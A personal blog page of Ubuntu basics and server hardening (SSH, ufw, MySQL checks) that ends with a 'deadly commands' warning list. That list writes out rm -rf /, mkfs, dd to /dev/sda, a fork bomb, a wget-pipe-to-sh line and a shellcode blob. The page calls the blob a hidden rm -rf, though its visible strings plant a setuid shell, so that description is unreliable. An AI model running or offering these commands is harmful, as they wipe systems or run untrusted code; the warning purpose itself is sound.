<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Where all of the tragic happens. You should really turn back now.">
    <meta name="author" content="">

    <!-- FB -->
  	<meta property="og:title" content="..." />
  	<meta property="og:site_name" content="..."/>
  	<meta property="og:url" content="http://..." />
  	<meta property="og:description" content="..." />
  	<meta property="og:type" content="article" />
  	<meta property="og:image" content="http://..." />
  	<meta property="og:image:type" content="/images/jpeg" />
  	<meta property="og:image:width" content="1200" />
  	<meta property="og:image:height" content="650" />

  	<!-- FB alt translations -->
  	<meta property="og:locale" content="en_US" />

    <title>
      
        Linux basics
      
    </title>

    <!-- fav and touch -->
    <link rel="shortcut icon" type="image/png" href="/favicon.png?">

    <!-- CSS -->
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <link href='https://fonts.googleapis.com/css?family=Ubuntu:400,300,500' rel='stylesheet' type='text/css'>
    <link href='https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,300,300italic,400italic,600,600italic' rel='stylesheet' type='text/css'>
    <link href="/css/libs/font-awesome.min.css" rel="stylesheet">
    <link href="/css/styles.css" rel="stylesheet">

    <!-- JS -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
    <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

</head>

<body>

  
<!-- Basic nav -->

<nav id="mainnav" class="navbar navbar-default navbar-fixed-top">
  <div class="container">

    <!-- Brand and toggle get grouped for better mobile display -->
    <div class="navbar-header">
      <a class="navbar-brand" href="/index.html"><i class="fa fa-bug" aria-hidden="true"></i> This incident will be reported</a>
      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
      <span class="sr-only">Toggle navigation</span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      </button>
    </div>
    <!-- Collect the nav links, forms, and other content for toggling -->
    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
      <ul class="nav navbar-nav navbar-right">
        <li>
          <a href="/blog.html">Adventures in bullshit <i class="fa fa-terminal" aria-hidden="true"></i></a>
        </li>
      </ul>
    </div><!-- /.navbar-collapse -->

  </div>
</nav>


  <div class="post">

    <div class="container push">
      <div class="row">

        <div class="col-sm-9">
          <h1 id="ubuntu-linux-basics">Ubuntu Linux basics</h1>

<p>Hey, want to learn some Linux commands? Me neither.</p>

<hr />
<hr class="rule" />

<h2 id="looking-around">Looking around</h2>

<p>List all with attributes and permissions</p>

<div class="highlighter-rouge"><pre class="highlight"><code>ls -la
</code></pre>
</div>

<p>List files with size</p>

<div class="highlighter-rouge"><pre class="highlight"><code>ls -h
</code></pre>
</div>

<hr />

<h2 id="moving-around">Moving around</h2>

<p>Remove folder</p>

<div class="highlighter-rouge"><pre class="highlight"><code>rm -r folder-name
</code></pre>
</div>

<p>Remove folder with no prompt. Be <strong>extremely</strong> careful with the <code class="highlighter-rouge">rm -rf</code> command because you can wipe out the whole system with it. See more in the <strong>deadly commands</strong> * section.</p>

<div class="highlighter-rouge"><pre class="highlight"><code>rm -rf folder-name
</code></pre>
</div>

<p>Rename folder or files</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mv old-name new-name
</code></pre>
</div>

<p>Move file somewhere else</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mv file-name /somewhere-else
</code></pre>
</div>

<p>Move folder somewhere else</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mv -R folder-name /somewhere-else
</code></pre>
</div>

<hr class="rule" />

<hr />

<h1 id="server-settings">Server settings</h1>

<p>Based on a typical <a href="https://www.digitalocean.com/help/getting-started/setting-up-your-server/">digitalocean</a> Ubuntu droplet. There are also some good resources to look into at <a href="https://www.linode.com/docs/security/securing-your-server">Linode</a>, depending on how each is deployed.</p>

<hr />

<h2 id="add-a-new-user-with-root-privileges">Add a new user with root privileges</h2>

<p>Login as root and type:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>adduser newuser
</code></pre>
</div>

<p>Follow the prompt and create a strong password. Now add the new user to the sudo group.</p>

<div class="highlighter-rouge"><pre class="highlight"><code>gpasswd -a newuser sudo
</code></pre>
</div>

<hr />

<h2 id="configure-ssh-daemon">Configure SSH Daemon</h2>

<p>Modify the SSH daemon configuration (the program that allows remote login) to disallow remote SSH access to the root account.</p>

<p>Open the configuration file:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>nano /etc/ssh/sshd_config
</code></pre>
</div>

<p>Locate line:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>PermitRootLogin yes
</code></pre>
</div>

<p>Modify this line to:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>PermitRootLogin no
</code></pre>
</div>

<p><strong>Reload SSH</strong></p>

<div class="highlighter-rouge"><pre class="highlight"><code>service ssh restart
</code></pre>
</div>

<hr />

<h2 id="configure-uncomplicated-firewall-ufw">Configure Uncomplicated Firewall (ufw)</h2>

<p>This sets up the bare minimum without SSL/TLS or SMTP opened. Full config docs from digitalocean is over <a href="https://www.digitalocean.com/community/tutorials/how-to-setup-a-firewall-with-ufw-on-an-ubuntu-and-debian-cloud-server">here</a>.</p>

<p>Create an exception for SSH connections so that we can maintain access for remote administration.</p>

<p>The SSH daemon runs on port 22 by default and <code class="highlighter-rouge">ufw</code> can implement a rule by name if the default has not been changed. So if you have not modified SSH port, you can enable the exception by typing:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>sudo ufw allow ssh
</code></pre>
</div>

<p>Allow only specific IP addresses if you want:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>sudo ufw allow from 192.168.255.255
</code></pre>
</div>

<p>Allow access to port 80 for a HTTP web server:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>sudo ufw allow 80/tcp
</code></pre>
</div>

<p>Review selections:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>sudo ufw show added
</code></pre>
</div>

<p>Enable firewall:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>sudo ufw enable
</code></pre>
</div>

<p>Check status:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>sudo ufw status verbose
</code></pre>
</div>

<hr />

<h2 id="sql">SQL</h2>

<p>Where the fuck is this stuff? Typically the path for a basic LAMP setup is located in /var/lib/mysql.</p>

<p>If you are getting database connection errors, you might want to check if SQL is even running.</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mysqladmin -u root -p status
</code></pre>
</div>

<p>Or with this if you are logged in as root already.</p>

<div class="highlighter-rouge"><pre class="highlight"><code>service mysql status
</code></pre>
</div>

<p>If it isn’t you’ll get a message something like this…</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mysqladmin: connect to server at 'localhost' failed
error: 'Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2)'
Check that mysqld is running and that the socket: '/var/run/mysqld/mysqld.sock' exists!
</code></pre>
</div>

<p>Or this…</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mysql stop/waiting
</code></pre>
</div>

<p>Start it up like so:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>service mysql start
</code></pre>
</div>

<p>Or if it’s already started and you want to restart</p>

<div class="highlighter-rouge"><pre class="highlight"><code>service mysql restart
</code></pre>
</div>

<hr />

<h2 id="checking-stats">Checking stats</h2>

<p>If you want to know what’s going on with space or RAM usage there are a few options.</p>

<p>The <code class="highlighter-rouge">free</code> command will give you bare bones memory usage.</p>

<div class="highlighter-rouge"><pre class="highlight"><code>free -m
</code></pre>
</div>

<p><code class="highlighter-rouge">vmstat</code> will give you some more RAM detail of whats and wheres.</p>

<div class="highlighter-rouge"><pre class="highlight"><code>vmstat -s
</code></pre>
</div>

<p>Real time monitoring can be viewed with the <code class="highlighter-rouge">top</code> or <code class="highlighter-rouge">htop</code> command.</p>

<div class="highlighter-rouge"><pre class="highlight"><code>top
</code></pre>
</div>

<div class="highlighter-rouge"><pre class="highlight"><code>htop
</code></pre>
</div>

<p>To see what processes are running on your machine, sorted by their memory usage, run:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>ps aux | awk '{print $2, $4, $11}' | sort -k2rn | head -n 15
</code></pre>
</div>

<p>Look for established connections</p>

<div class="highlighter-rouge"><pre class="highlight"><code>netstat -anp | grep :80 | grep ESTABLISHED | wc -l
</code></pre>
</div>

<hr />

<h1 id="deadly-commands-">Deadly commands *</h1>

<p>Someday, some asshole on a forum may try to ruin your life by tricking you into using these commands. Take a hard look and remember them. <strong>Never</strong> run any of the following:</p>

<hr />

<h2 id="delete-all-files-in-the-root-directory">Delete all files in the root directory</h2>

<div class="highlighter-rouge"><pre class="highlight"><code>rm -rf /
</code></pre>
</div>

<p>This freaks me out just to write it. This means force a deletion of everything in the root directory and all subfolders without prompt. So basically wiping your entire system in 5 lines of code.</p>

<p>There is “hidden” hex of this as well that looks like this.</p>

<div class="highlighter-rouge"><pre class="highlight"><code>char esp[] __attribute__ ((section(“.text”))) /* e.s.p
release */
= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68”
“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99”
“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7”
“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56”
“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31”
“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69”
“\x6e\x2f\x73\x68\x00\x2d\x63\x00”
“cp -p /bin/sh /tmp/.beyond; chmod 4755
/tmp/.beyond;”;
</code></pre>
</div>

<hr />

<h2 id="reformat-data-on-device">Reformat Data on device</h2>

<div class="highlighter-rouge"><pre class="highlight"><code>mkfs
mkfs.ext3
mkfs.anything
</code></pre>
</div>

<p>Whatever follows the mkfs command will be destroyed and replaced with a blank filesystem.</p>

<hr />

<h2 id="block-device-manipulation">Block device manipulation</h2>

<div class="highlighter-rouge"><pre class="highlight"><code>any_command &gt; /dev/sda
dd if=something of=/dev/sda
</code></pre>
</div>

<p>Watch out for <code class="highlighter-rouge">/dev/sda</code> These commands cause raw data to be written to a block device. Often this will clobber the filesystem and cause total loss of data.</p>

<p>Another similar command would be to drop all files into a black hole.</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mv ~ /dev/null
</code></pre>
</div>

<hr />

<h2 id="fork-bomb">Fork bomb</h2>

<div class="highlighter-rouge"><pre class="highlight"><code>:(){:|:&amp;};:
</code></pre>
</div>

<p>This short line defines a shell function that creates new copies of itself until the system freezes, forcing a hard reset of the computer. Basically an internal DDOS attack.</p>

<hr />

<h2 id="malicious-code-in-shell-scripts">Malicious code in Shell scripts</h2>

<div class="highlighter-rouge"><pre class="highlight"><code>wget http://some_place/some_file -O- | sh
</code></pre>
</div>

<p>Or similarly</p>

<div class="highlighter-rouge"><pre class="highlight"><code>wget http://some_place/some_file
sh ./some_file
</code></pre>
</div>

<p>This may be trickier to spot as there are so many tools out there as package managers. Bottom line is don’t execute a shell script from a fishy source. Mind the <code class="highlighter-rouge">-O- | sh</code> or <code class="highlighter-rouge">sh ./</code> commands.</p>

<hr />

<p>* The deadly commands are only posted for my personal warnings and I'm not responsible for any blowings up of people's systems. This information is pretty easy to dig up, so I'm not the one who released them into the wild.</p>

        </div>

        <div class="col-sm-3 sidenav">
          <h3>No such process</h3>
          <hr class="heading">
          <ul>
            
            <li>
              <a href="/post/2017/03/28/screw-video.html">Enough with the video</a>
            </li>
            
            <li>
              <a href="/post/2017/03/20/dantes-squarespace.html">Dante's Squarespace</a>
            </li>
            
            <li>
              <a href="/post/2016/12/16/firebase.html">Jekyll Firebase hosting</a>
            </li>
            
            <li>
              <a href="/post/2016/09/30/wp-abyss.html">Wordpress and the abyss</a>
            </li>
            
            <li>
              <a href="/post/2016/09/29/js-hair-pulling.html">JS hair pulling</a>
            </li>
            
            <li>
              <a href="/post/2016/08/29/drupal-clusterfuck.html">Drupal clusterfuck</a>
            </li>
            
            <li>
              <a href="/post/2016/08/26/AWS-S3-resource-sharing.html">AWS S3 resource sharing</a>
            </li>
            
            <li>
              <a href="/post/2016/05/12/prose-configure.html">Github pages prose.io config</a>
            </li>
            
            <li>
              <a href="/post/2016/04/28/simple-sass.html">Basic SASS</a>
            </li>
            
            <li>
              <a href="/post/2016/04/28/git-cheat-sheet.html">git cheat sheet</a>
            </li>
            
            <li>
              <a href="/2016/04/20/simple-xml-sitemap.html">XML simple sitemap</a>
            </li>
            
            <li>
              <a href="/post/2016/04/20/jekyll-site-hosted-on-github.html">Jekyll Crap</a>
            </li>
            
            <li>
              <a href="/2016/04/20/common-analytics-settings.html">Analytics starter settings</a>
            </li>
            
            <li>
              <a href="/2016/04/18/youtube-custom-transcriptions.html">Youtube custom transcriptions</a>
            </li>
            
            <li>
              <a href="/2016/04/18/aws-ec2-easy-engine.html">AWS EC2 LEMP stack</a>
            </li>
            
            <li>
              <a href="/2016/04/15/vagrant-scotchbox.html">Vagrant Scotchbox LAMP stack</a>
            </li>
            
            <li>
              <a href="/2016/04/15/open-vpn-el-capitan-bug.html">Open VPN El Capitan bug</a>
            </li>
            
            <li>
              <a href="/post/2016/04/15/common-css.html">Common CSS</a>
            </li>
            
            <li>
              <a href="/2016/04/05/global-git-ignore.html">Global .gitignore</a>
            </li>
            
            <li>
              <a href="/post/2016/04/05/basic-linux-commands.html">Linux basics</a>
            </li>
            
            <li>
              <a href="/post/2016/04/05/aws-s3.html">AWS S3 Static Setup</a>
            </li>
            
            <li>
              <a href="/2016/04/05/OSX-setup.html">OSX setup</a>
            </li>
            
            <li>
              <a href="/2016/04/04/markdown.html">Markdown / Kramdown</a>
            </li>
            
          </ul>
        </div>

      </div>
    </div>

  </div>

  
<footer>

  <div class="container">
    <div class="row">
      <div class="col-sm-12">

      <hr>
      <p class="text-center">It's 2017 in case you live on the moon.</p>

      </div>
    </div>
  </div>

</footer><!-- footer -->


  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>


</body>
